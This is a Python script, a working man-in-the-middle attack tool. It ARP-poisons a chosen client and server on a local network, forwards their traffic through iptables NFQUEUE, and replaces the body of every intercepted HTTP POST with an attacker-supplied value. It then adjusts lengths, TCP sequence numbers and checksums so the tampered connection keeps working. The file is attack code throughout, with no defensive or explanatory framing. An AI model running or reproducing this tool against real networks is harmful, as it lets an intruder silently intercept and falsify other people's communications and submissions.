#!/usr/bin/python
from scapy.all import *
from multiprocessing import Process
import time
import argparse
import os
import nfqueue
import re

def getOwnIp(interface):
    return os.popen('ip addr show ' + interface).read().split('inet ')[1].split('/')[0]

def getMAC(args):
    ownMAC = open('/sys/class/net/' + args.interface + '/address').read().strip()
    clientMAC = re.findall('\[.*\]', os.popen('arping -c 1 -I ' + args.interface + ' ' + args.clientIP).read().splitlines()[1])[0][1:-1]
    serverMAC = re.findall('\[.*\]', os.popen('arping -c 1 -I ' + args.interface + ' ' + args.serverIP).read().splitlines()[1])[0][1:-1]
    return ownMAC, clientMAC, serverMAC

def getArguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('clientIP', help='IP address of the first machine')
    parser.add_argument('serverIP', help='IP address of the second machine')
    parser.add_argument('--spoofValue', '-s', required=True, help='Value to send instead of the genuine one')
    parser.add_argument('--interface', '-i', default='wlan0', help='Interface to use, default is wlan0')
    args = parser.parse_args()
    args.ownIp = getOwnIp(args.interface)
    args.ownMAC, args.clientMAC, args.serverMAC = getMAC(args)
    print('Configuration:')
    print('\t' + str(args)[str(args).find('(') + 1:str(args).find(')')].replace(' ', '\n\t'))
    return args

def osConfiguration(args):
    print('Adjusting system settings...')
    sysFile = open("/proc/sys/net/ipv4/ip_forward", "w")
    sysFile.write('1')
    sysFile.close()
    sysFile = open("/proc/sys/net/ipv4/conf/" + args.interface + "/send_redirects", "w")
    sysFile.write('0')
    sysFile.close()
    os.system("iptables -Z")
    os.system("iptables -F")
    os.system("iptables -X")
    os.system("iptables --append FORWARD --in-interface " +  args.interface + " --source " + args.serverIP + " --destination " + args.clientIP + " -j NFQUEUE")
    os.system("iptables --append FORWARD --in-interface " +  args.interface + " --source " + args.clientIP + " --destination " + args.serverIP + " -j NFQUEUE")

def osRestore(interface):
    print('Restoring system settings...')
    sysFile = open("/proc/sys/net/ipv4/ip_forward", "w")
    sysFile.write('0')
    sysFile.close()
    sysFile = open("/proc/sys/net/ipv4/conf/" + interface + "/send_redirects", "w")
    sysFile.write('1')
    sysFile.close()
    os.system("iptables -Z")
    os.system("iptables -F")
    os.system("iptables -X")

def createNetFilterQueue():
    queue = nfqueue.queue()
    queue.open()
    queue.bind(socket.AF_INET)
    queue.set_callback(callback)
    queue.create_queue(0)
    return queue

def arpPoison(args):
    print('Starting ARP poisoning...')
    conf.iface = args.interface
    clientPacket = ARP(op='is-at', hwsrc=args.ownMAC)
    serverPacket = ARP(op='is-at', hwsrc=args.ownMAC)
    clientPacket.psrc = args.serverIP
    clientPacket.pdst = args.clientIP
    clientPacket.hwdst = args.clientMAC
    serverPacket.psrc = args.clientIP
    serverPacket.pdst = args.serverIP
    serverPacket.hwdst = args.serverMAC
    while True:
        send(clientPacket, verbose=False)
        send(serverPacket, verbose=False)
        time.sleep(5.0)

def arpRestore(args):
    print('Restoring victims\' ARP tables...')
    conf.iface = args.interface
    clientPacket = ARP(op='is-at')
    serverPacket = ARP(op='is-at')
    clientPacket.hwsrc = args.serverMAC
    clientPacket.hwdst = args.clientMAC
    clientPacket.psrc = args.serverIP
    clientPacket.pdst = args.clientIP
    serverPacket.hwsrc = args.clientMAC
    serverPacket.hwdst = args.serverMAC
    serverPacket.psrc = args.clientIP
    serverPacket.pdst = args.serverIP
    send(clientPacket, verbose=False)
    send(serverPacket, verbose=False)
 
def callback(payload):
    # difference in TCP sequence and acknowledgement caused by spoofed value extending/shortening load length
    if 'ackDiff' not in callback.__dict__:
        callback.ackDiff = 0
    tcpFINFlag = 0x01
    packet = IP(payload.get_data())
    try:
        if tcpFINFlag & packet[TCP].flags and packet.src == callback.client:
            # client initialized finish, reset sequence and acknowledgement spoof
            callback.ackDiff = 0
        elif callback.ackDiff != 0 and packet.src == callback.server:
            packet[TCP].ack -= callback.ackDiff
            del packet[IP].chksum
            del packet[TCP].chksum
        elif callback.ackDiff != 0 and packet.src == callback.client:
            packet[TCP].seq += callback.ackDiff
            del packet[IP].chksum
            del packet[TCP].chksum
    except:
        pass
    try:
        if 'POST' in packet.load:
            callback.server = packet.dst
            callback.client = packet.src
            prevLen = len(packet[TCP].payload)
            unchangedLoad = packet.load.rsplit('Content-Length: ', 1)[0]
            packet.load = unchangedLoad + 'Content-Length: %d\r\n\r\n%s' % (len(callback.spoofValue), callback.spoofValue)
            newLen = len(packet[TCP].payload)
            lenDiff = newLen - prevLen
            packet[IP].len += lenDiff
            callback.ackDiff += lenDiff
            del packet[IP].chksum
            del packet[TCP].chksum
    except:
        pass
    send(packet, verbose=False)
    payload.set_verdict(nfqueue.NF_DROP)

def main():
    args = getArguments()
    osConfiguration(args)
    callback.spoofValue = args.spoofValue
    queue = createNetFilterQueue()
    arpPoisonDaemon = Process(target=arpPoison, args=(args,))
    arpPoisonDaemon.daemon = True
    arpPoisonDaemon.start()
    try:
        queue.try_run() 
    except KeyboardInterrupt:
        queue.unbind(socket.AF_INET)
        queue.close()
        arpPoisonDaemon.terminate()
        arpRestore(args)
        osRestore(args.interface)

if __name__ == '__main__':
    main()
